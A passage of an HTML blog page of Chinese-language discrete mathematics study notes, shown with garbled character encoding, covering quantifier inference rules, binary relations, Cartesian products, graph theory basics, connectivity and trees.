title="æ¨ç†è§„åˆ™"></a>æ¨ç†è§„åˆ™</h6><ul><li>æ¶ˆå»é‡è¯è§„åˆ™<ul><li>UI(å…¨ç§°é‡è¯æ¶ˆå»)è§„åˆ™ä»»æ„ï½˜ï¼§(ï½˜)â‡’ï¼§(ï½™) å…¶ä¸­ï¼§(ï½˜)å¯¹ï½™æ˜¯è‡ªç”±çš„ã€‚æˆ–è€… ï½˜ï¼§(ï½˜)â‡’ï¼§(ï½ƒ) å…¶ä¸­ ï½ƒ ä¸ºä»»æ„ä¸ªä½“å¸¸é‡</li><li>EI(å­˜åœ¨é‡è¯æ¶ˆå»)è§„åˆ™å­˜åœ¨ï½˜ï¼§(ï½˜)â‡’ï¼§(ï½ƒ) å…¶ä¸­ï½ƒä¸ºä½¿ï¼§(ï½ƒ)ä¸ºçœŸçš„ç‰¹å®šä¸ªä½“å¸¸é‡</li></ul></li><li>å¼•å…¥é‡è¯è§„åˆ™<ul><li>ï¼µï¼§(å…¨ç§°é‡è¯å¼•å…¥)è§„åˆ™ï¼§(ï½˜)â‡’ä»»æ„ï½™ï¼§(ï½™) å…¶ä¸­ ï¼§(ï½˜)å¯¹äº ï½™ æ˜¯è‡ªç”±çš„</li><li>ï¼¥ï¼§(å­˜åœ¨é‡è¯å¼•å…¥)è§„åˆ™ï¼§(ï½ƒ)â‡’å­˜åœ¨ï½˜ï¼§(ï½˜) å…¶ä¸­ï½ƒä¸ºç‰¹å®šä¸ªä½“å¸¸é‡æˆ–è€… ï¼§(ï½˜)â‡’å­˜åœ¨ï½™ï¼§(ï½™) å…¶ä¸­ ï¼§(ï½˜)å¯¹äºï½™æ˜¯è‡ªç”±çš„</li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609172049815-1024x309.png"></p><h6 id="æ¨ç†å®šå¾‹"><a href="#æ¨ç†å®šå¾‹" class="headerlink" title="æ¨ç†å®šå¾‹"></a>æ¨ç†å®šå¾‹</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609172112678-1024x326.png"></p><hr><h2 id="ç¬¬å››ç« -äºŒå…ƒå…³ç³»"><a href="#ç¬¬å››ç« -äºŒå…ƒå…³ç³»" class="headerlink" title="ç¬¬å››ç« _äºŒå…ƒå…³ç³»"></a>ç¬¬å››ç« _äºŒå…ƒå…³ç³»</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173101772-1024x572.png"></p><hr><h5 id="äºŒå…ƒå…³ç³»åŠå…¶è¡¨ç¤º"><a href="#äºŒå…ƒå…³ç³»åŠå…¶è¡¨ç¤º" class="headerlink" title="äºŒå…ƒå…³ç³»åŠå…¶è¡¨ç¤º"></a>äºŒå…ƒå…³ç³»åŠå…¶è¡¨ç¤º</h5><p><strong>äºŒå…ƒå…³ç³»çš„å®šä¹‰</strong>ï¼šç”±ä¸¤ä¸ªå…ƒç´ ï½˜ï¼Œï½™æŒ‰ç…§ä¸€å®šçš„æ¬¡åºç»„æˆçš„äºŒå…ƒç»„è¢«ç§°ä¸ºæœ‰åºå¶å¯¹ï¼Œç®€ç§°åºå¶ã€‚ è®°ä½œâ€¹ï½˜ï¼Œï½™â€ºï¼Œ è¯»ä½œâ€œåº å¶ ï½˜ï¼Œï½™â€ã€‚å…¶ä¸­ç§°ï½˜ä¸ºâ€¹ï½˜ï¼Œï½™â€ºçš„ç¬¬ä¸€å…ƒç´ ï¼Œï½™ä¸ºâ€¹ï½˜ï¼Œï½™â€ºçš„ç¬¬äºŒå…ƒç´ ã€‚</p><p>æ¨å¹¿åºå¶çš„æ€æƒ³ï¼Œå¯ä»¥å®šä¹‰ä»»æ„ï½ä¸ªå…ƒç´ çš„æœ‰åºåºåˆ—ï¼šç”±ï½ä¸ªå…ƒç´ aï¼‘ï¼Œï½ï¼’ï¼ŒÂ·Â·Â·ï¼Œï½ï½æŒ‰ç…§ä¸€å®šæ¬¡åºç»„æˆçš„ï½å…ƒç»„è¢«ç§°ä¸º<strong>ï½é‡æœ‰åºç»„</strong>ï¼Œè®°ä½œâ€¹ï½ï¼‘ ï¼Œï½ï¼’ï¼ŒÂ·Â·Â·ï¼Œï½ï½â€ºã€‚</p><p>å°†åºå¶ä¸é›†åˆè”ç³»èµ·æ¥ï¼Œ å¯ä»¥å¾—åˆ°ç¬›å¡å„¿ç§¯çš„å®šä¹‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173626678-1024x153.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609173651637-1024x266.png"></p><h6 id="ç¬›å¡å°”ç§¯çš„è¿ç®—"><a href="#ç¬›å¡å°”ç§¯çš„è¿ç®—" class="headerlink" title="ç¬›å¡å°”ç§¯çš„è¿ç®—"></a>ç¬›å¡å°”ç§¯çš„è¿ç®—</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230609174538092.png"></p><p>æ³¨æ„ï¼šç©ºé›†Ã—ä»»ä½•å­é›†&#x3D;&#x3D;ç©ºé›†</p><p><strong>Â·</strong></p><p><strong>Â·</strong></p><p><strong>Â·</strong></p><hr><h2 id="ç¬¬å…­ç« -å›¾"><a href="#ç¬¬å…­ç« -å›¾" class="headerlink" title="ç¬¬å…­ç« _å›¾"></a>ç¬¬å…­ç« _å›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608184416367-1024x568.png"></p><hr><h5 id="å›¾çš„åŸºæœ¬æ¦‚å¿µ"><a href="#å›¾çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="å›¾çš„åŸºæœ¬æ¦‚å¿µ"></a>å›¾çš„åŸºæœ¬æ¦‚å¿µ</h5><h6 id="å›¾çš„å®šä¹‰"><a href="#å›¾çš„å®šä¹‰" class="headerlink" title="å›¾çš„å®šä¹‰"></a>å›¾çš„å®šä¹‰</h6><p>ä¸€ä¸ª<strong>å›¾</strong>æ˜¯ä¸€ä¸ªåºå¶&lt;V,E&gt;ï¼Œè®°ä¸ºG&#x3D;&lt;V,E&gt;ã€‚</p><ul><li>V&#x3D;{v1,v2,v3Â·Â·Â·,vn}æ˜¯æœ‰é™éç©ºé›†åˆï¼Œviç§°ä¸º<strong>ç»“ç‚¹</strong>ï¼Œç®€ç§°ç‚¹ï¼ŒVç§°ä¸º<strong>ç»“ç‚¹é›†</strong>ã€‚</li><li>Eæ˜¯æœ‰é™é›†åˆï¼Œç§°ä¸º<strong>è¾¹é›†</strong>ï¼ŒEä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½æœ‰Vä¸­çš„ç»“ç‚¹å¯¹ä¸ä¹‹å¯¹åº”ï¼Œç§°ä¹‹ä¸º<strong>è¾¹</strong>ã€‚</li></ul><p>æ³¨æ„ä¸Šé¢çš„ç»“ç‚¹å¯¹å¯ä»¥ä½¿æœ‰åºçš„ä¹Ÿå¯ä»¥æ˜¯æ— åºçš„ï¼Œåˆ†åˆ«ä¸ºæœ‰å‘è¾¹å’Œæ— å‘è¾¹ã€‚</p><h6 id="å›¾çš„è¡¨ç¤º"><a href="#å›¾çš„è¡¨ç¤º" class="headerlink" title="å›¾çš„è¡¨ç¤º"></a>å›¾çš„è¡¨ç¤º</h6><p><strong>é›†åˆè¡¨ç¤º</strong>ï¼šå°†ä¸€ä¸ªå›¾è®°ä¸ºG&#x3D;&lt;V,E&gt;ï¼Œå¹¶å†™å‡ºäº†Vå’ŒEçš„é›†åˆè¡¨ç¤ºï¼Œç§°ä¸ºå›¾çš„é›†åˆè¡¨ç¤º</p><p><strong>å›¾å½¢è¡¨ç¤º</strong>ï¼šä¸ºäº†è¡¨ç¤ºæ–¹ä¾¿ï¼Œä¸€èˆ¬å¾€å¾€åªéœ€è¦ç”»å‡ºå›¾å½¢ã€‚</p><p><strong>çŸ©é˜µè¡¨ç¤º</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608185332879-1024x178.png"></p><p>æ— å‘å›¾å’Œæœ‰å‘å›¾çš„é‚»æ¥çŸ©é˜µæœ‰äº›ä¸åŒï¼Œæ— å‘å›¾çš„çŸ©é˜µä¸€å®šæ˜¯å¯¹ç§°çš„ã€‚</p><p>å¯¹è§’çº¿çš„æ•°å€¼ä¸º1è¡¨ç¤ºç¯ã€‚</p><h6 id="å›¾çš„æ“ä½œ"><a href="#å›¾çš„æ“ä½œ" class="headerlink" title="å›¾çš„æ“ä½œ"></a>å›¾çš„æ“ä½œ</h6><p><strong>åˆ é™¤è¾¹</strong>ï¼šè®¾ eâˆˆï¼¥ï¼Œç”¨G-eè¡¨ç¤ºä»ï¼§ä¸­å»æ‰è¾¹eå¾—åˆ°çš„å›¾ï¼Œè¯¥æ“ä½œç§°ä¸ºåˆ é™¤è¾¹ã€‚åˆè®¾ ï¼¥â€²âŠ†ï¼¥ï¼Œç”¨G-Eâ€²è¡¨ç¤ºä»Gä¸­åˆ é™¤Eâ€²ä¸­æ‰€æœ‰è¾¹å¾—åˆ°çš„å›¾ï¼Œæ“ä½œç§°ä¸ºåˆ é™¤è¾¹é›†ã€‚</p><p><strong>åˆ é™¤ç‚¹</strong>ï¼šè®¾ ï½–âˆˆï¼¶ï¼Œç”¨ï¼§ï¼ï½–è¡¨ç¤ºä»ï¼§ä¸­å»æ‰ç»“ç‚¹ï½–åŠï½–å…³è”çš„æ‰€æœ‰è¾¹å¾—åˆ°çš„å›¾ï¼Œè¯¥æ“ä½œç§°ä¸ºåˆ é™¤ç»“ç‚¹ã€‚åˆè®¾ï¼¶â€²âŠ‚ï¼¶ï¼Œç”¨G-ï¼¶â€²è¡¨ç¤ºä»ï¼§ä¸­åˆ é™¤ï¼¶â€²ä¸­æ‰€æœ‰ç»“ç‚¹åŠå…³è”çš„æ‰€æœ‰è¾¹å¾—åˆ°çš„å›¾ï¼Œè¯¥æ“ä½œç§°ä¸ºåˆ é™¤ç»“ç‚¹å­é›†ã€‚</p><p><strong>æ”¶ç¼©è¾¹</strong>ï¼šè®¾ï½…ï¼(ï½•ï¼Œï½–)âˆˆï¼¥ã€‚ç”¨ï¼§ï¼¼ï½…è¡¨ç¤ºä»ï¼§ä¸­åˆ é™¤ï½…ï¼Œå°†ï½…çš„ä¸¤ä¸ªç«¯ç‚¹ï½•ã€ï½–ç”¨ä¸€ä¸ªæ–°çš„ ç»“ç‚¹ ï½— ä»£æ›¿ï¼Œ ä½¿ï½—å…³è”é™¤ï½…å¤–çš„ï½•å’Œï½–å…³è”çš„ä¸€åˆ‡è¾¹ï¼Œè¯¥æ“ä½œç§°ä¸ºè¾¹çš„æ”¶ç¼©ã€‚ä¸€ä¸ªå›¾ï¼§å¯ä»¥æ”¶ç¼©ä¸ºå›¾Hï¼Œæ˜¯æŒ‡ ï¼¨å¯ä»¥ä»G ç»è¿‡è‹¥å¹²æ¬¡è¾¹çš„æ”¶ç¼©è€Œå¾—åˆ°ã€‚</p><p><strong>æ–°åŠ è¾¹</strong>ï¼šè®¾ï½•ï¼Œvâˆˆï¼¶(ï½•ã€ï½–å¯èƒ½ç›¸é‚»ï¼Œä¹Ÿå¯èƒ½ä¸ç›¸é‚»)ã€‚ç”¨ï¼§âˆª(ï½•ï¼Œï½–)è¡¨ç¤ºåœ¨ï½•ï¼Œï½–ä¹‹é—´åŠ ä¸€æ¡è¾¹(ï½•ï¼Œï½–)ï¼Œè¯¥æ“ä½œç§°ä¸ºåŠ æ–°è¾¹ã€‚</p><h6 id="é‚»æ¥ç‚¹ä¸é‚»æ¥è¾¹"><a href="#é‚»æ¥ç‚¹ä¸é‚»æ¥è¾¹" class="headerlink" title="é‚»æ¥ç‚¹ä¸é‚»æ¥è¾¹"></a>é‚»æ¥ç‚¹ä¸é‚»æ¥è¾¹</h6><p><strong>é‚»æ¥ç‚¹</strong>ï¼šä¸€æ¡è¾¹çš„ä¸¤ä¸ªç«¯ç‚¹</p><p><strong>é‚»æ¥è¾¹</strong>ï¼šå…·æœ‰å…¬å…±ç»“ç‚¹çš„ä¸¤æ¡è¾¹</p><p><strong>å­¤ç«‹ç»“ç‚¹</strong>ï¼šå›¾ä¸­ä¸ä¸ä»»ä½•ç»“ç‚¹ç›¸é‚»æ¥çš„ç»“ç‚¹ç§°ä¸ºå­¤ç«‹ç»“ç‚¹</p><blockquote><p><strong>é›¶å›¾</strong>ï¼šä»…ç”±å­¤ç«‹ç»“ç‚¹ç»„æˆçš„å›¾ã€‚</p><p><strong>å¹³å‡¡å›¾</strong>ï¼šä»…å«æœ‰ä¸€ä¸ªèŠ‚ç‚¹çš„é›¶å›¾</p></blockquote><p>å«æœ‰nä¸ªç»“ç‚¹ï¼Œmä¸ªè¾¹çš„å›¾ç§°ä¸º**(n,m)å›¾**</p><h6 id="å›¾çš„åˆ†ç±»"><a href="#å›¾çš„åˆ†ç±»" class="headerlink" title="*å›¾çš„åˆ†ç±»"></a>*å›¾çš„åˆ†ç±»</h6><p><strong>æœ‰æ— æ–¹å‘</strong>ï¼šæ— å‘å›¾ï¼Œæœ‰å‘å›¾ï¼Œæ··åˆå›¾</p><p><strong>æœ‰æ— å¹³è¡Œè¾¹</strong>ï¼šå¤šé‡å›¾ï¼Œçº¿å›¾ï¼Œ<strong>ç®€å•å›¾</strong>ã€‚</p><blockquote><ul><li>å«æœ‰å¹³è¡Œè¾¹çš„å›¾ç§°ä¸ºå¤šé‡å›¾ï¼Œå¹³è¡Œè¾¹çš„æ¡æ•°ç§°ä¸ºé‡æ•°ã€æœ‰å‘å›¾ä¸­å§‹è¾¹ä¸ç»ˆè¾¹ç›¸åŒæ‰æ˜¯å¹³è¡Œè¾¹ï¼Œæ— å‘å›¾ä¸­ä¸¤ç»“ç‚¹é—´çš„éƒ½æ˜¯å¹³è¡Œè¾¹ã€‘</li><li>éå¤šé‡å›¾å°±æ˜¯çº¿å›¾</li><li><strong>æ— ç¯çš„çº¿å›¾å°±æ˜¯ç®€å•å›¾</strong></li></ul></blockquote><p><strong>æ˜¯å¦å«æƒ</strong>ï¼šèµ‹æƒå›¾ï¼Œæ— æƒå›¾</p><h6 id="å­å›¾ä¸è¡¥å›¾"><a href="#å­å›¾ä¸è¡¥å›¾" class="headerlink" title="å­å›¾ä¸è¡¥å›¾"></a>å­å›¾ä¸è¡¥å›¾</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608191416444-1024x260.png"></p><p>ç”Ÿæˆå­å›¾ï¼šç»“ç‚¹æ²¡å˜ï¼Œè¾¹åªæœ‰ä¸€éƒ¨åˆ†</p><p>å¯¼å‡ºå­å›¾ï¼šä¸€éƒ¨åˆ†ç»“ç‚¹ï¼Œä½†æ˜¯è¿™éƒ¨åˆ†ç»“ç‚¹ä¹‹é—´çš„è¾¹å…¨éƒ¨éƒ½æœ‰ã€æ¯”å¦‚å…¨æ ¡æ•°æ®ä¸­å¯¼å‡ºä¸€ä¸ªå¹´çº§çš„æ•°æ®æ¥ã€‘</p><p><strong>å®Œå…¨å›¾</strong>ï¼š</p><ul><li>æ— å‘ç®€å•å›¾ä¸­[æ— ç¯çš„çº¿å›¾]ï¼šGä¸­ä»»æ„ä¸¤ä¸ªç»“ç‚¹ä¹‹é—´éƒ½æœ‰è¾¹ç›¸è¿ï¼Œç§°ä¸º<strong>æ— å‘å®Œå…¨å›¾</strong>ï¼Œç®€ç§°å®Œå…¨å›¾</li><li>æœ‰å‘ç®€å•å›¾ä¸­ï¼šGä¸­ä»»æ„ä¸¤ä¸ªç»“ç‚¹éƒ½æœ‰æ–¹å‘ç›¸åçš„ä¸¤æ¡è¾¹ç›¸è¿ï¼Œç§°ä¸ºæœ‰å‘ç®€å•å›¾ï¼Œä¹Ÿç®€ç§°å®Œå…¨å›¾</li></ul><p><strong>è¡¥å›¾</strong>ï¼šç»“ç‚¹é›†ç›¸åŒï¼Œè¾¹é›†æ˜¯å®Œå…¨å›¾è¾¹é›†çš„è¡¥é›†</p><blockquote><p>æ³¨æ„ç»“ç‚¹å’ŒåŸå›¾æ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯è¯´æœ‰å¯èƒ½æœ‰å­¤ç«‹ç»“ç‚¹çš„æƒ…å†µï¼Œä¸èƒ½æ¼äº†</p></blockquote><hr><h5 id="æ¡æ‰‹å®šç†"><a href="#æ¡æ‰‹å®šç†" class="headerlink" title="æ¡æ‰‹å®šç†"></a>æ¡æ‰‹å®šç†</h5><p><strong>åº¦</strong>ï¼šG&#x3D;&lt;V,E&gt;ä¸­ä»¥ç»“ç‚¹vâˆˆVä¸ºç«¯ç‚¹çš„è¾¹æ•°ï¼ˆæœ‰ç¯çš„æ—¶å€™è®¡ç®—ä¸¤æ¬¡ï¼‰ç§°ä¸ºç»“ç‚¹vçš„åº¦æ•°ã€‚ï¼Œç®€ç§°åº¦ï¼Œè®°ä¸ºdeg(v)</p><p>æœ‰å‘å›¾ä¸­è¦åŒºåˆ†å…¥åº¦ä¸å‡ºåº¦ã€‚å…¥åº¦ä¸ºdeg-(v),å‡ºåº¦ä¸ºdeg+(v)</p><p><strong>æ‚¬æŒ‚ç»“ç‚¹</strong>ï¼šåº¦æ•°ä¸º1çš„ç»“ç‚¹ç§°ä¸ºæ‚¬æŒ‚ç»“ç‚¹</p><p><strong>æ‚¬æŒ‚è¾¹</strong>:ä»¥æ‚¬æŒ‚ç»“ç‚¹ä¸ºç«¯ç‚¹çš„è¾¹ç§°ä¸ºæ‚¬æŒ‚è¾¹</p><h6 id="å®šç†6-1ï¼ˆæ¡æ‰‹å®šç†ï¼‰"><a href="#å®šç†6-1ï¼ˆæ¡æ‰‹å®šç†ï¼‰" class="headerlink" title="å®šç†6.1ï¼ˆæ¡æ‰‹å®šç†ï¼‰"></a>å®šç†6.1ï¼ˆæ¡æ‰‹å®šç†ï¼‰</h6><p>å›¾ä¸­ç»“ç‚¹åº¦æ•°çš„æ€»å’Œæ˜¯è¾¹æ•°çš„ä¸¤å€</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608192457742.png"></p><p>æœ‰å‘å›¾ä¸­ï¼Œå…¥åº¦ä¹‹å’Œç­‰äºå‡ºåº¦ä¹‹å’Œç­‰äºè¾¹æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608192559519.png"></p><hr><h5 id="å›¾çš„åŒæ„"><a href="#å›¾çš„åŒæ„" class="headerlink" title="å›¾çš„åŒæ„"></a>å›¾çš„åŒæ„</h5><p>å½¢è±¡çš„è¯´ï¼Œè‹¥ç»“ç‚¹å¯ä»¥ä»»æ„æŒªåŠ¨ä½ç½®ï¼Œè€Œä¸”è¾¹æ˜¯å®Œå…¨å¼¹æ€§çš„ï¼Œåªè¦åœ¨ä¸æ‹‰æ–­å’Œé•¿åº¦ä¸å‹ç¼©ä¸º0çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå›¾å¯ä»¥å˜æˆå¦å¤–ä¸€ä¸ªå›¾ï¼Œå°±ç§°è¿™ä¸¤ä¸ªå›¾æ˜¯åŒæ„çš„ã€‚</p><p>ä¸¤ä¸ªå›¾åŒæ„æœ‰ä¸‰ä¸ª<strong>å¿…è¦æ¡ä»¶</strong>ï¼š</p><ul><li>ç»“ç‚¹æ•°ç›®ç›¸åŒ</li><li>è¾¹æ•°ç›¸åŒ</li><li>åº¦æ•°ç›¸åŒçš„ç»“ç‚¹æ•°ç›¸åŒ</li></ul><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šè¿°ä¸‰ä¸ªæ¡ä»¶æœ‰ä¸€ä¸ªä¸æ»¡è¶³ï¼Œå°±ä¸åŒæ„ï¼Œä½†ä»–ä»¬éƒ½æ»¡è¶³ä¸èƒ½è¯´æ˜å›¾æ˜¯åŒæ„çš„ã€‚</p><hr><h5 id="é€šè·¯ä¸å›è·¯"><a href="#é€šè·¯ä¸å›è·¯" class="headerlink" title="é€šè·¯ä¸å›è·¯"></a>é€šè·¯ä¸å›è·¯</h5><p>ç»™å®šG&#x3D;&lt;V,E&gt;ä¸­ç»“ç‚¹å’Œè¾¹ç›¸ç»§äº¤é”™å‡ºç°çš„åºåˆ—Î“ï¼v0e0v1e1v2Â·Â·Â·ekvk</p><p><strong>é€šè·¯</strong>ï¼šè‹¥v0å’Œvkä¸æ˜¯åŒä¸€ä¸ªç»“ç‚¹ï¼Œåˆ™Î“ ç§°ä¸ºv0åˆ°vkçš„ä¸€æ¡é€šè·¯</p><p><strong>å›è·¯</strong>ï¼šv0&#x3D;vkï¼Œåˆ™æ­¤é€šè·¯ç§°ä¸ºå›è·¯ã€‚</p><blockquote><p><strong>ç®€å•é€šè·¯</strong>ï¼šé€šè·¯ä¸­æ‰€æœ‰çš„è¾¹äº’ä¸ç›¸åŒï¼Œæˆ–ä¸€æ¡è¿¹</p><p><strong>åŸºæœ¬é€šè·¯</strong>ï¼šé€šè·¯ä¸­æ‰€æœ‰çš„ç»“ç‚¹äº’ä¸ç›¸åŒ(ä»è€Œæ‰€æœ‰çš„è¾¹äº’ä¸ç›¸åŒ)</p><p><strong>åŸºæœ¬å›è·¯</strong>ï¼šå›è·¯ä¸­æ‰€æœ‰çš„ç»“ç‚¹äº’ä¸ç›¸åŒ(ä»è€Œæ‰€æœ‰çš„è¾¹äº’ä¸ç›¸åŒ)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194012367-1024x171.png"></p><h6 id="é€šè·¯ä¸å›è·¯çš„è®¡ç®—"><a href="#é€šè·¯ä¸å›è·¯çš„è®¡ç®—" class="headerlink" title="é€šè·¯ä¸å›è·¯çš„è®¡ç®—"></a>é€šè·¯ä¸å›è·¯çš„è®¡ç®—</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194023330-1024x203.png"></p><h6 id="å¯è¾¾ä¸è·ç¦»"><a href="#å¯è¾¾ä¸è·ç¦»" class="headerlink" title="å¯è¾¾ä¸è·ç¦»"></a>å¯è¾¾ä¸è·ç¦»</h6><p><strong>å¯è¾¾</strong>ï¼šviä¸vjä¹‹é—´å­˜åœ¨é€šè·¯ï¼Œå°±ç§°viå’Œvjæ˜¯å¯è¾¾çš„ã€‚</p><p><strong>è·ç¦»</strong>ï¼šå¦‚æœviä¸vjæ˜¯å¯è¾¾çš„ï¼Œé‚£ä¹ˆviå¸¦vjçš„é•¿åº¦æœ€çŸ­çš„é€šè·¯çš„é•¿åº¦ç§°ä¸ºè·ç¦»ã€‚è®°ä¸ºd(vi,vj)</p><p><strong>å®šç†</strong>ï¼šåœ¨ä¸€ä¸ªå…·æœ‰nä¸ªç»“ç‚¹çš„å›¾ä¸­ï¼Œå¦‚æœä»ç»“ç‚¹viåˆ°ç»“ç‚¹vjå­˜åœ¨ä¸€æ¡é€šè·¯ï¼Œé‚£ä¹ˆä»viåˆ°vjå­˜åœ¨ä¸€æ¡é•¿åº¦ä¸å¤§äºn-1çš„é€šè·¯ã€‚ â€”â€“ç”±é¸½ç¬¼å®šç†å¯ä»¥è¯å¾—</p><p>å®šä¹‰<strong>å¯è¾¾æ€§çŸ©é˜µP</strong>ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194941633-1024x267.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608195040171.png"></p><hr><h5 id="å›¾çš„è¿é€šæ€§"><a href="#å›¾çš„è¿é€šæ€§" class="headerlink" title="å›¾çš„è¿é€šæ€§"></a>å›¾çš„è¿é€šæ€§</h5><h6 id="æ— å‘å›¾çš„è¿é€šæ€§"><a href="#æ— å‘å›¾çš„è¿é€šæ€§" class="headerlink" title="æ— å‘å›¾çš„è¿é€šæ€§"></a>æ— å‘å›¾çš„è¿é€šæ€§</h6><p><strong>è¿é€šå›¾</strong>ï¼šæ— å‘å›¾Gä¸­ä»»æ„ä¸¤ä¸ªç»“ç‚¹éƒ½æ˜¯å¯è¾¾çš„ï¼Œåˆ™ç§°Gä¸ºè¿é€šå›¾ï¼Œå¦åˆ™ä¸ºéè¿é€šå›¾ï¼Œæˆ–åˆ†ç¦»å›¾</p><p><strong>è¿é€šåˆ†æ”¯</strong>ï¼šæ— å‘å›¾Gä¸­ç»“ç‚¹ä¹‹é—´çš„å¯è¾¾å…³ç³»Rçš„æ¯ä¸ªç­‰ä»·ç±»å¯¼å‡ºçš„å­å›¾éƒ½æˆä¸ºGçš„ä¸€ä¸ªè¿é€šåˆ†æ”¯ï¼Œç”¨P(G)è¡¨ç¤ºã€‚</p><blockquote><p>æ˜¾ç„¶ï¼Œæ— å‘å›¾Gæ˜¯è¿é€šå›¾å½“ä¸”ä»…å½“p(G)&#x3D;1ï¼›æ¯ä¸ªç»“ç‚¹å’Œæ¯æ¡è¾¹éƒ½åœ¨ä¸”ä»…åœ¨ä¸€ä¸ªè¿é€šåˆ†æ”¯ä¸­ã€‚</p></blockquote><h6 id="æœ‰å‘å›¾çš„è¿é€šæ€§"><a href="#æœ‰å‘å›¾çš„è¿é€šæ€§" class="headerlink" title="æœ‰å‘å›¾çš„è¿é€šæ€§"></a>æœ‰å‘å›¾çš„è¿é€šæ€§</h6><p><strong>å¼±è¿é€šå›¾</strong>ï¼šç•¥å»æ–¹å‘ä¹‹åæ˜¯è¿é€šçš„ï¼Œå°±ç§°å¼±è¿é€šå›¾ï¼Œå¦åˆ™å°±æ˜¯éè¿é€šå›¾</p><p><strong>å•å‘è¿é€šå›¾</strong>ï¼šGä¸­ä»»æ„ä¸€å¯¹ç»“ç‚¹ä¹‹é—´ï¼Œè‡³å°‘æœ‰ä¸€ä¸ªç»“ç‚¹åˆ°å¦ä¸€ä¸ªç»“ç‚¹æ˜¯å¯è¾¾çš„</p><p><strong>å¼ºè¿é€šå›¾</strong>ï¼šGä¸­ä»»æ„ä¸€å¯¹ç»“ç‚¹éƒ½æ˜¯ç›¸äº’å¯è¾¾çš„ã€‚</p><h6 id="è¿é€šæ€§çš„åˆ¤æ–­"><a href="#è¿é€šæ€§çš„åˆ¤æ–­" class="headerlink" title="è¿é€šæ€§çš„åˆ¤æ–­"></a>è¿é€šæ€§çš„åˆ¤æ–­</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608195839525-1024x232.png"></p><p>è¿é€šåˆ†æ”¯ï¼šå¼ºè¿é€šåˆ†æ”¯&#x2F;å•å‘è¿é€šåˆ†æ”¯&#x2F;å¼±è¿é€šåˆ†æ”¯ Â·Â·Â·</p><hr><h2 id="ç¬¬ä¸ƒç« -ç‰¹æ®Šå›¾"><a href="#ç¬¬ä¸ƒç« -ç‰¹æ®Šå›¾" class="headerlink" title="ç¬¬ä¸ƒç« _ç‰¹æ®Šå›¾"></a>ç¬¬ä¸ƒç« _ç‰¹æ®Šå›¾</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608200043478-1024x923.png"></p><hr><h5 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h5><ul><li><strong>è¿é€šè€Œä¸å«å›è·¯</strong>çš„æ— å‘å›¾ç§°ä¸ºæ— å‘æ ‘ï¼Œç®€ç§°æ ‘</li></ul><p>æ ‘ä¸­åº¦æ•°ä¸º1çš„ç»“ç‚¹ç§°ä¸º<strong>å¶</strong>ï¼Œåº¦æ•°å¤§äº1çš„ç»“ç‚¹ç§°ä¸º<strong>åˆ†æ”¯ç‚¹</strong>æˆ–è€…<strong>å†…éƒ¨ç»“ç‚¹</strong>ã€‚æ¯ä¸ªè¿é€šåˆ†æ”¯éƒ½æ˜¯æ ‘çš„æ— å‘å›¾ç§°ä¸º<strong>æ£®æ—</strong>ï¼Œå¹³å‡¡å›¾ç§°ä¸ºå¹³å‡¡æ ‘</p><blockquote><p>æ ‘ä¸­æ²¡æœ‰ç¯å’Œå¹³è¡Œè¾¹ï¼Œå› æ­¤ä¸€å®šæ˜¯ç®€å•å›¾ï¼Œå¹¶ä¸”ä»»ä½•éå¹³å‡¡æ ‘ä¸­ï¼Œéƒ½æ²¡æœ‰åº¦æ•°ä¸º0çš„ç»“ç‚¹</p></blockquote><h6 id="å®šç†7-1"><a href="#å®šç†7-1" class="headerlink" title="å®šç†7.1"></a>å®šç†7.1</h6><p>ä»¥ä¸‹6ä¸ªå‘½é¢˜ç­‰ä»·ï¼šG&#x3D;&lt;V,E&gt; V&#x3D;n , E &#x3D; m</p><ul><li>Gè¿é€šä¸”ä¸å«å›è·¯ï¼Œå³Gæ˜¯æ ‘</li><li>Gä¸­æ— å›è·¯ï¼Œä¸”<strong>m&#x3D;n-1</strong> <strong>ã€è¾¹æ•°æ˜¯ç»“ç‚¹æ•°å‡ä¸€ã€‘</strong></li><li>Gæ˜¯è¿é€šçš„ï¼Œä¸”<strong>m&#x3D;n-1</strong></li><li>Gä¸­æ— å›è·¯ï¼Œä½†åœ¨Gä¸­ä»»æ„ä¸¤ä¸ªç»“ç‚¹ä¹‹é—´å¢åŠ ä¸€ä¸ªæ–°è¾¹ï¼Œå°±å¾—åˆ°å”¯ä¸€çš„åŸºæœ¬å›è·¯</li><li>Gæ˜¯è¿é€šçš„ï¼Œä½†åˆ 